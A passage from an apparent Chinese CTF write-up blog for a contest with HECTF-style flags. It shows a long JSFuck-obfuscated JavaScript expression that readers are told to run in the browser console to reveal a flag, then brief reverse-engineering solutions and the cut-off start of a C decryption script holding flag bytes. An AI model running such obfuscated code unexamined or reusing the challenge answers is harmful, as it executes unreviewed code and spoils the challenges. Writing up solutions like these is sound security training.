+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+([]+&#123;&#125;)[!+[]+!![]])+([][[]]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+([]+&#123;&#125;)[!+[]+!![]])+([][[]]+[])[!+[]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([][[]]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]]+(![]+[])[!+[]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])</span><br></pre></td></tr></table></figure><p>在console执行一下，得到flag</p><h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p>填完就可以获得flag</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h2><p>Ida64位打开，<code>Shift+F12</code>查看字符串，直接找到</p><h2 id="Baby-upx"><a href="#Baby-upx" class="headerlink" title="Baby_upx"></a>Baby_upx</h2><p>Ida反编译，写一下解密脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">H E C T F &#123;T h i &gt; \  Z  i  S&#x27;  &#x27;  J  L2  9  b W  e&#125;</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 22 21 22 23 24 25 </span></span><br><span class="line"><span class="comment">0x48,</span></span><br><span class="line"><span class="comment">0x45,</span></span><br><span class="line"><span class="comment">0x43,</span></span><br><span class="line"><span class="comment">0x54,</span></span><br><span class="line"><span class="comment">0x46,</span></span><br><span class="line"><span class="comment">0x7b</span></span><br><span class="line"><span class="comment">*/</span></span><br><span 